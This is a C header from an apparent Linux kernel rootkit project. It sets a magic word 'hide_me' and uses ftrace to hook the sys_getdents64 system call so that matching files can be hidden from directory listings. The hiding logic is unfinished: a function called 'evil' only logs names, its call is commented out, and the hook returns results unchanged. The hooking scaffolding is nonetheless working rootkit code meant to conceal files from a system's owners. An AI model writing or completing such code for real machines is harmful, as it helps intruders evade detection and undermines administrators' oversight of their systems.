#pragma once

#include <linux/cred.h>
#include <linux/linkage.h>
#include <linux/stddef.h>
#include <linux/syscalls.h>

#include "stdlib.h"
#include "rootkit.h"
#include "ftrace_helper.h"


char* MAGIC_WORD = "hide_me";


/* Just so we know what the linux_dirent looks like.
   actually defined in fs/readdir.c
   exported in linux/syscalls.h
*/
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[];
};


void evil(char* name) {    
    rk_info("Looking at: %s\n", name);
    if(strstr(name, MAGIC_WORD)){
        rk_info("Found file to hide: %s\n", name);
    }
}

static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs*);

static asmlinkage int hook_sys_getdents64(const struct pt_regs* regs) {
    struct linux_dirent __user *dirent = SECOND_ARG(regs, struct linux_dirent __user *);
    int res;
    
    res = orig_sys_getdents64(regs);

    printk(KERN_DEBUG "orig_sys_getdents64 done\n");

    //evil(dirent->d_name);


    return res;
}


static struct ftrace_hook syscall_hooks[] = {
    HOOK("sys_getdents64", hook_sys_getdents64, &orig_sys_getdents64),
};
